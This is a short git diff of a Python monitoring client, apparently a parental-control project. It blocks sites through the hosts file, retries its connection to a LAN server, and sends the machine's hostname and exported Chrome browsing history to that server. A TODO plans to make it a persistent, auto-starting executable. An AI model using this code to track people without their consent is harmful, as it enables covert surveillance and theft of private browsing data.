@@ -8,12 +8,18 @@ linux_host = '/etc/hosts'
 window_host = r"C:\Windows\System32\drivers\etc\hosts"
 default_folder = window_host 
 redirect = "127.0.0.1"
-
+computer_name=socket.gethostname()
 
 class Client():#TODO: ip working,make it exe,always on - turns on restart, all print() wiil be deleted
     def __init__(self, port=8810, ip="192.168.1.26"):# ip wiil change
         self.s = socket.socket()
-        self.s.connect((ip,port))
+        while True:
+            try:
+                self.s.connect((ip,port))
+            except Exception as e:
+                print("waiting to server to come up")
+            else:
+                break    
         self.sites_to_block=[["https://www.one.co.il",0,23]]    #[[url1,start,end],[url2.start,end]]
         print("connected")         
 
@@ -21,15 +27,15 @@ class Client():#TODO: ip working,make it exe,always on - turns on restart, all p
         self.first_message()
         while True:
             self.limitation()
-            self.block_websites() 
+            #self.block_websites() 
             time.sleep(1)
             self.history()
                      
     def first_message(self):
-        self.s.send(f"name%{socket.gethostname()}".encode())
+        self.s.send(f"name%{computer_name}".encode())
         
     def history(self):
-        self.s.send("history".encode())
+        self.s.send(f"history%{computer_name}".encode())
         bh.get_browserhistory()   
         bh.write_browserhistory_csv()
         f = open("chrome_history.csv", "rb")
